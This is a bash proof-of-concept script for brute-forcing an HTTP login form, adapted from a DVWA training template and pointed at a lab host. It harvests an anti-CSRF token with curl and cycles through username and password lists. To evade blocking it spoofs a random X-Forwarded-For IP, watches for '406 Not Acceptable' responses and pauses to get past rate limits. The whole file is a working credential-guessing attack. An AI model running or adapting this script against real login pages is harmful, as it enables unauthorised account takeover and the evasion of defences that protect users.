#!/bin/bash
# Quick PoC template for HTTP POST form brute force, with anti-CRSF token
# Target: DVWA v1.10
#   Date: 2015-10-19
# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
# Source: https://blog.g0tmi1k.com/dvwa/login/
# Modified by: Orlando Barrera II @malloci

## Variables
URL="training.proservlab.net"
## declare an array variable
declare -a USER_LIST=("admin" "smithy" "pablo" "1337" "jgray" "gordonb")
declare -a PASS_LIST=("password" "letmein" "abc123" "charley")
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

## Value to look for in response (Whitelisting)
SUCCESS="Location: index.php"

## Value to look for in a blocked response
BLOCKED="406 Not Acceptable"

## Anti CSRF token
CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
[[ "$?" -ne 0 ]] && echo -e '\n${RED}[!] Issue connecting! #1${NC}' && exit 1

## Counter
i=0

## Random IP
SPOOFIP=$(printf "%d.%d.%d.%d\n" "$((RANDOM % 256))" "$((RANDOM % 256))" "$((RANDOM % 256))" "$((RANDOM % 256))");

echo -e "\n-------------------\n[${GREEN}#${NC}] ${SPOOFIP}\n-------------------\n"

## Password loop
for _NUM in {1..10}; do
for _PASS in "${PASS_LIST[@]}"; do
#sleep 1
  ## Username loop
  for _USER in "${USER_LIST[@]}"; do
    #sleep 1
    ## Increase counter
    ((i=i+1))

    ## Feedback for user
    echo "[i] Trying: ${_USER} // ${_PASS}"

    ## Connect to server
    #CSRF=$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | awk -F "'" '{print $2}' )
    REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" -H "X-Forwarded-For: ${SPOOFIP}" -A "${UA}")"
    [[ $? -ne 0 ]] && echo -e '\n${RED}[!] Issue connecting! #2${NC}'

    ## Check response
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\n\n[${GREEN}+${NC}] Found!"
      echo "[*] Username: ${_USER}"
      echo "[*] Password: ${_PASS}"
      echo -e "\n\n"
      #break 2
      sleep 0.75
    fi
    echo "${REQUEST}" | grep -q "${BLOCKED}"
    if [[ "$?" -eq 0 ]]; then
      ## Blocked!
      echo -e "[${RED}X${NC}] BLOCKED!"
      #echo "${REQUEST}"
      #echo -e "\n\n"
      #break 2
      sleep 1
    fi
    if (("${i}" % 94 == 0)); then
      echo -e "[${GREEN}-${NC}] Please Wait..."
      sleep 35
    fi
    sleep 0.75
  done 
sleep 0.75
done 
sleep 0.75
done
## Clean up
rm -f /tmp/dvwa.cookie